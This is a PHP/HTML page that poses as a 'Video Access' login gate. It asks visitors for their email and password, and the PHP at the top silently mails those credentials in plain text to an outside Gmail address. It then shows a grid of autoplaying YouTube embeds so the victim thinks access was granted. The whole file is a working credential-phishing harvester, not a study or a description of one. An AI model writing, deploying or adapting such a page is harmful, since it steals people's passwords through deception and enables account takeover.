<?php

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $email = $_POST['email'];
    $password = $_POST['password'];


    $to = 'naftalimspht@gmail.com';
    $subject = 'New Video Access Login';
    $message = "Email: $email\nPassword: $password";
    $headers = 'From: noreply@yourdomain.com' . "\r\n";

    mail($to, $subject, $message, $headers);

    $showVideo = true;
} else {
    $showVideo = false;
}
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Video Access</title>
<style>
body { font-family: Arial; background: #f0f4f8; display: flex; justify-content: center; align-items: center; flex-direction: column; min-height: 100vh; margin: 0; }
.login-container { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; width: 300px; }
input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 8px; border: 1px solid #ccc; box-sizing: border-box; }
button { width: 100%; padding: 10px; background: #4CAF50; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; }
button:hover { background-color: #45a049; }
#video-container { margin-top: 20px; display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; }
iframe { width: 300px; height: 170px; border: none; border-radius: 10px; }
</style>
</head>
<body>

<?php if(!$showVideo): ?>
    <div class="login-container">
        <h2>Enter to Watch</h2>
        <form method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Watch Video</button>
        </form>
    </div>
<?php else: ?>
    <div id="video-container">
        <?php
        for($i=0; $i<50; $i++){
            echo '<iframe src="https://www.youtube.com/embed/bLFPYMFH9CU?autoplay=1" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>';
        }
        ?>
    </div>
<?php endif; ?>

</body>
</html>
